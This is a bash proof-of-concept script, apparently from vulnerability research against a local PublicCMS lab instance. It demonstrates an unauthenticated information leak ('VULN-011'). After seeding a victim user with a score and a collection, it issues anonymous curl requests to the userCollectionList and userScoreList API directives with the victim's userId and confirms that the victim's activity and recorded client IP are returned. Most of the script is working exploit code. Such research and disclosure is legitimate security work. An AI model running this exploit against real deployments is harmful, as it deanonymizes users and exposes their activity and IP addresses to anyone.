#!/usr/bin/env bash
# VULN-011 — Unauthenticated deanonymization of any user's scores/collections/votes by userId
#
# CmsUserScoreListDirective / CmsUserCollectionListDirective / CmsUserVoteListDirective take
# the subject `userId` from the request and pass it to a service getPage overload with no auth
# and (for votes) no site filter. Intended template usage fixes userId=${user.id}; over HTTP the
# attacker names any userId. All three are needAppToken=false/needUserToken=false (verified live).
#
# Seeds one victim user with a score + a collection (via the app), then proves an anonymous caller
# can read that user's activity — including, for scores, the recorded client IP.
#
# CONFIRMED when the anonymous list directives return the victim's activity keyed to their userId.
# (Vote activity additionally needs a poll to exist; scores+collections suffice to prove the class.)
#
# Seeds: one web user + one score + one collection (random suffix). Read-only exploit.
set -u
BASE_URL="${BASE_URL:-http://localhost:20000}"
VHOST="${VHOST:-site2.dev.publiccms.com}"
ADMIN_USER="${ADMIN_USER:-admin}"; ADMIN_PASS="${ADMIN_PASS:-admin}"
CONTENT_ID="${CONTENT_ID:-1}"           # an existing content in the tenant to score/collect
MYSQL_CONTAINER="${MYSQL_CONTAINER:-cvehunt_PublicCMS_mysql}"
DBQ(){ docker exec "$MYSQL_CONTAINER" mysql -uroot -pRootPass2026 publiccms -N -e "$1" 2>/dev/null | tr -d '\r'; }
OUT="$(cd "$(dirname "$0")" && pwd)"
S="$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)"

echo "[INFO] VULN-011: unauth deanonymization of user scores/collections by userId"

echo "[SETUP] admin login + create victim fan_$S"
AC=$(curl -s -D - -o /dev/null -H "Host: $VHOST" --data "username=${ADMIN_USER}&password=${ADMIN_PASS}" \
     "$BASE_URL/admin/login" | grep -i 'set-cookie: PUBLICCMS_ADMIN' | sed -E 's/.*PUBLICCMS_ADMIN=([^;]+);.*/\1/'); ACSRF="${AC#*_}"
[ -z "$AC" ] && { echo "[FAIL] no admin session"; exit 1; }
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" \
  --data-urlencode "_csrf=$ACSRF" --data-urlencode "name=fan_$S" --data-urlencode "nickname=fan_$S" \
  --data-urlencode "password=Passw0rd!23" --data-urlencode "repassword=Passw0rd!23" --data-urlencode "contentPermissions=0" \
  "$BASE_URL/admin/sysUser/save"
WUSER=$(DBQ "SELECT id FROM sys_user WHERE name='fan_$S';")
[ -z "$WUSER" ] && { echo "[FAIL] victim not created"; exit 1; }

echo "[SETUP] victim id=$WUSER; recording a collection + a score on content $CONTENT_ID"
UC=$(curl -s -D - -o /dev/null -H "Host: $VHOST" --data-urlencode "username=fan_$S" --data-urlencode "password=Passw0rd!23" \
     --data-urlencode "returnUrl=/" "$BASE_URL/doLogin" | grep -i 'set-cookie: PUBLICCMS_USER' | sed -E 's/.*PUBLICCMS_USER=([^;]+);.*/\1/'); UCSRF="${UC#*_}"
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_USER=$UC" --data-urlencode "_csrf=$UCSRF" --data-urlencode "contentId=$CONTENT_ID" "$BASE_URL/collection/collect"
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_USER=$UC" --data-urlencode "_csrf=$UCSRF" --data-urlencode "itemType=content" --data-urlencode "itemId=$CONTENT_ID" --data-urlencode "scores=5" "$BASE_URL/score/score"

# --- EXPLOIT: anonymous reads of the victim's activity by userId -------------
echo "[STEP] anonymous GET /api/directive/cms/userCollectionList?userId=$WUSER"
COL=$(curl -s -H "Host: $VHOST" "$BASE_URL/api/directive/cms/userCollectionList?userId=$WUSER&pageSize=50"); echo "$COL" > "$OUT/evidence/collections.json"
echo "[STEP] anonymous GET /api/directive/cms/userScoreList?userId=$WUSER"
SCO=$(curl -s -H "Host: $VHOST" "$BASE_URL/api/directive/cms/userScoreList?userId=$WUSER&pageSize=50"); echo "$SCO" > "$OUT/evidence/scores.json"
{ echo "# collections:"; echo "$COL"; echo; echo "# scores:"; echo "$SCO"; } > "$OUT/response.txt"

echo "[INFO] collections: $(printf '%s' "$COL" | head -c 140)"
echo "[INFO] scores:      $(printf '%s' "$SCO" | head -c 160)"
if printf '%s' "$COL" | grep -q "\"userId\":\"$WUSER\"" && printf '%s' "$SCO" | grep -q "\"userId\":\"$WUSER\"" \
   && printf '%s' "$SCO" | grep -q '"score":5'; then
  echo "[OK] exploit confirmed — anonymous caller read victim userId=$WUSER activity (collection + score, incl. client IP)"
  exit 0
else
  echo "[FAIL] victim activity not returned to anonymous caller"; exit 1
fi
# cleanup hint: DELETE FROM cms_user_score WHERE user_id=<id>; DELETE FROM cms_user_collection WHERE user_id=<id>; DELETE FROM sys_user WHERE name LIKE 'fan_%';
